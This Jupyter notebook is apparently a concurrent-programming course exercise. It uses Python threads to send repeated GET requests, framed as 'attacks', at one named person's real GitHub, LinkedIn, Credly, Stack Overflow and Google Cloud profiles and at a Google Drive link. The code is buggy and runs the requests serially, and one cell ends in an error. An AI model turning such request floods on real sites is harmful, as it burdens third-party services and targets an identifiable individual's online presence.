{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "e840edce-8dc4-4009-902b-81bce0a0c2f2",
   "metadata": {},
   "source": [
    "<!-- PROFILE LINK -->\n",
    "\n",
    "<h1 style = \"text-align:center; font-size: 30px\">PROGRAMACIÓN CONCURRENTE Y DISTRIBUIDA</h1>\n",
    "<a href =\"https://github.com/diegok36\">\n",
    "<img src=\"https://avatars.githubusercontent.com/u/99168948?v=4\" style=\"float:left;vertical-align:centre\" width=\"110\" height=\"110\" title = \"Diego Rodriguez Sanz 22167749\">\n",
    "<a href =\"https://github.com/diegok36?tab=repositories\">\n",
    "<img src=\"https://media-exp1.licdn.com/dms/image/C4D0BAQEu_Aa76fcmPw/company-logo_200_200/0/1630998679429?e=2159024400&v=beta&t=2feC9GG7RWCWizTqsK5HzDWB1TL2DOQuAVwnMf6FFvk\" title = \"M41\" alt=\"UE\" width=\"110\" height=\"110\" style=\"float:right;vertical-align:centre\">"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "50bb969e-332a-4379-981e-24cd5d34fda3",
   "metadata": {},
   "source": [
    "# 1. Se solicita atacar a las siguientes webs:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 52,
   "id": "b3e14998-3155-4c46-b037-c499376cdc75",
   "metadata": {},
   "outputs": [],
   "source": [
    "import threading, os, platform, requests, json"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 66,
   "id": "4ba57ec0-a2ef-48e3-90b1-b892243aab10",
   "metadata": {},
   "outputs": [],
   "source": [
    "veces_matar_github = 100"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 67,
   "id": "fd0647f1-7feb-42a8-9541-f6a9828fd6f6",
   "metadata": {},
   "outputs": [],
   "source": [
    "veces_matar_linkedin=50"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 68,
   "id": "28c6d174-0ad7-489f-83aa-7fdebea52e0a",
   "metadata": {},
   "outputs": [],
   "source": [
    "veces_matar_credly=20"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 69,
   "id": "9e276d08-0451-465b-a21e-e7076205109e",
   "metadata": {},
   "outputs": [],
   "source": [
    "veces_matar_stack=30"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 70,
   "id": "280fb2c4-25a9-4397-adba-4353947e8618",
   "metadata": {},
   "outputs": [],
   "source": [
    "veces_matar_cloudkill=20"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "62ec1160-ddbf-4185-81fb-4915c20d7138",
   "metadata": {},
   "source": [
    "# https codigos"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 65,
   "id": "cfe88868-ce8a-431a-93d1-8b1727cd8ec0",
   "metadata": {},
   "outputs": [],
   "source": [
    "url1=\"https://github.com/sukuzhanay\"\n",
    "url2=\"https://www.linkedin.com/in/sucuzhanay/\"\n",
    "url3=\"https://www.credly.com/users/christian-vladimir-sucuzhanay-arevalo/badges\"\n",
    "url4=\"https://stackoverflow.com/users/6025932/christian-vladimir-sucuzhanay\"\n",
    "url5=\"https://www.cloudskillsboost.google/public_profiles/c094dd66-f266-4f77-a808-a0601b187009\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 36,
   "id": "d2f73e9b-31a5-4f1e-9f50-c812611f7e25",
   "metadata": {},
   "outputs": [],
   "source": [
    "def matar_github():\n",
    "    print(requests.get(url1))\n",
    "    threading.current_thread()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 37,
   "id": "d499eee2-7124-40b6-aa6a-8be9ad948d85",
   "metadata": {},
   "outputs": [],
   "source": [
    "def matar_linkedin():\n",
    "    print(requests.get(url2))\n",
    "    threading.current_thread()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 38,
   "id": "164ac464-bfc6-44ca-8faf-b14959789ef0",
   "metadata": {},
   "outputs": [],
   "source": [
    "def matar_credly():\n",
    "    print(requests.get(url3))\n",
    "    threading.current_thread()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 39,
   "id": "06b1329b-e658-493b-8992-3cf24c6ffbd1",
   "metadata": {},
   "outputs": [],
   "source": [
    "def matar_stack():\n",
    "    print(requests.get(url4))\n",
    "    threading.current_thread()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 40,
   "id": "afee295e-93fb-4a4d-88d7-473e6704515a",
   "metadata": {},
   "outputs": [],
   "source": [
    "def matar_cloudkill():\n",
    "    print(requests.get(url5))\n",
    "    threading.current_thread()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 71,
   "id": "47809006-b2c3-4c47-b8b0-bde6833f2e74",
   "metadata": {},
   "outputs": [
    {
     "ename": "TypeError",
     "evalue": "'int' object is not callable",
     "output_type": "error",
     "traceback": [
      "\u001b[1;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[1;31mTypeError\u001b[0m                                 Traceback (most recent call last)",
      "Cell \u001b[1;32mIn [71], line 2\u001b[0m\n\u001b[0;32m      1\u001b[0m \u001b[38;5;28;01mfor\u001b[39;00m i \u001b[38;5;129;01min\u001b[39;00m \u001b[38;5;28mrange\u001b[39m (veces_matar_github):\n\u001b[1;32m----> 2\u001b[0m     threading\u001b[38;5;241m.\u001b[39mThread(target\u001b[38;5;241m=\u001b[39m\u001b[43mmatar_github\u001b[49m\u001b[43m(\u001b[49m\u001b[43m)\u001b[49m)\u001b[38;5;241m.\u001b[39mstart()\n",
      "\u001b[1;31mTypeError\u001b[0m: 'int' object is not callable"
     ]
    }
   ],
   "source": [
    "for i in range (veces_matar_github):\n",
    "    threading.Thread(target=matar_github()).start()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2645bee1-5b61-456e-b367-ffa07ae4d063",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<Response [999]>\n",
      "<Response [999]>\n",
      "<Response [999]>\n",
      "<Response [999]>\n",
      "<Response [999]>\n",
      "<Response [999]>\n",
      "<Response [999]>\n",
      "<Response [999]>\n",
      "<Response [999]>\n",
      "<Response [999]>\n",
      "<Response [999]>\n",
      "<Response [999]>\n",
      "<Response [999]>\n",
      "<Response [999]>\n",
      "<Response [999]>\n",
      "<Response [999]>\n",
      "<Response [999]>\n",
      "<Response [999]>\n",
      "<Response [999]>\n",
      "<Response [999]>\n",
      "<Response [999]>\n",
      "<Response [999]>\n",
      "<Response [999]>\n",
      "<Response [999]>\n",
      "<Response [999]>\n",
      "<Response [999]>\n",
      "<Response [999]>\n",
      "<Response [999]>\n",
      "<Response [999]>\n",
      "<Response [999]>\n",
      "<Response [999]>\n",
      "<Response [999]>\n",
      "<Response [999]>\n",
      "<Response [999]>\n",
      "<Response [999]>\n",
      "<Response [999]>\n"
     ]
    }
   ],
   "source": [
    "for i in range (veces_matar_linkedin):\n",
    "    threading.Thread(target=matar_linkedin()).start()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f9ec5def-c4c2-4044-a0f2-9f6ff52056c2",
   "metadata": {},
   "outputs": [],
   "source": [
    "for i in range (veces_matar_credly):\n",
    "    threading.Thread(target=matar_credly()).start()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "65f2aba9-d75a-4cff-864e-78c8dc10359e",
   "metadata": {},
   "outputs": [],
   "source": [
    "for i in range (veces_matar_stack):\n",
    "    threading.Thread(target=matar_stack()).start()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1886dff8-80c5-454e-a0af-70be6566487f",
   "metadata": {},
   "outputs": [],
   "source": [
    "for i in range (veces_matar_cloudkill):\n",
    "    threading.Thread(target=matar_cloudkill()).start()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "bacf357c-b967-4aea-b123-b46088685441",
   "metadata": {},
   "source": [
    "# 2 Se solicita atacar con 5 hilos a la siguiente web:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 64,
   "id": "c0c74ff1-9dbe-4216-b6b6-28840c8b3ebf",
   "metadata": {},
   "outputs": [],
   "source": [
    "import threading, os, platform, requests, json"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 61,
   "id": "779384f1-f54b-4624-9623-4ea2ad69002e",
   "metadata": {},
   "outputs": [],
   "source": [
    "veces_matar_drive = 5"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 56,
   "id": "36de0675-fe6d-485b-b896-b470f8bba5ed",
   "metadata": {},
   "outputs": [],
   "source": [
    "url_drive = \"https://drive.google.com/uc?export=download&id=1ADxSr55eYTRSRF-44LXnKbY4n5bMWaY-\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 58,
   "id": "ea259216-a9ce-4d5d-a398-2a183322a5d8",
   "metadata": {},
   "outputs": [],
   "source": [
    "def matar_drive():\n",
    "    print(requests.get(url_drive))\n",
    "    threading.current_thread()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 63,
   "id": "cf0aeb04-a025-4d87-b684-b1f458f976fa",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<Response [200]>\n",
      "<Response [200]>\n",
      "<Response [200]>\n",
      "<Response [200]>\n",
      "<Response [200]>\n"
     ]
    }
   ],
   "source": [
    "for i in range (veces_matar_drive):\n",
    "    threading.Thread(target = matar_drive()).start()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3c57db84-13ca-4881-80b3-b152d043ef3b",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.8"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
